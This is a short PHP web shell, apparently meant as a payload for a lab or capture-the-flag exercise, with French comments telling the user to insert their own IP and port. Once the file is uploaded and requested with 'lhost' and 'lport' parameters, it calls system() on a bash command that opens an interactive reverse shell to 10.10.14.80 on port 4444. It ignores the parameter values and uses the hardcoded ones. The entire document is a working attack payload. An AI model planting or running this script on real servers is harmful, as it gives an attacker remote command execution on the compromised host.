<?php
if (isset($_GET['lhost']) && isset($_GET['lport'])) {
    $lhost = "10.10.14.80";  // Remplacez par VOTRE IP
    $lport = "4444";        // Remplacez par VOTRE PORT

    $cmd = "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'";
    system($cmd);
}
?>